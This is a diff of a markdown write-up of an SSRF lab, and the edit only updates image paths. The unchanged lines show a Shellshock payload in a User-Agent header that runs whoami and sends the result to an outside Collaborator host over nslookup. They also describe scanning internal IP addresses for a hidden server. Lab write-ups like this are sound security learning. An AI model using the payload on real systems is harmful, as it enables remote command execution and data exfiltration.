@@ -357,7 +357,7 @@ When looking at the website the Collaborator Everywhere extension found two conc
 
 The first thing is Referer which indicate Blind SSRF and second is user agent which might be vulnerable to the ShellShock exploit.
 
-![1.png](1.png)
+![1.png](content/posts/server-side-request-forgery-ssrf/1.png)
 
 We use a basic shellshock exploit to find the user and in the referer we use intruder to find the username.
 
@@ -368,7 +368,7 @@ User-Agent: () { :; }; /usr/bin/nslookup $(whoami).oum8yyrum1ube4w2youh099m8de42
 ```
 
 Then acccording to the context given by the lab we knew that the internal server is in [http://192.168.0](http://192.168.0).{}:8080/ so we used the intruder to find out which internal sever ip is correct
-![2.png](2.png)
+![2.png](content/posts/server-side-request-forgery-ssrf/2.png)
 
 ![3.png](3.png)
 
